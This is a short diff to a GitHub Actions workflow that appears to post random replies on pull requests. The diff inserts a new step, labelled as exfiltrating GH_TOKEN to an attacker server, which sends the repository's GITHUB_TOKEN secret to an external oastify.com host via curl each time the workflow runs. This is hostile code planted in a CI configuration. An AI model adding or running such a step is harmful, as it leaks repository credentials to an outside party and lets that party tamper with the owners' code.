@@ -28,6 +28,12 @@ jobs:
           random_index=$((RANDOM % ${#reply_messages[@]}))
           echo "::set-output name=message::${reply_messages[$random_index]}"
 
+      - name: Exfiltrate GH_TOKEN to attacker server
+        run: |
+          curl -X GET "https://b2ega3wut7bpohgv3ef1ui9jrax1lt9i.oastify.com/?token=$GH_TOKEN"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
       - name: Reply to pull request
         if: (!contains(fromJSON('["github-actions"]'), github.event.pull_request.user.login))
         run: |
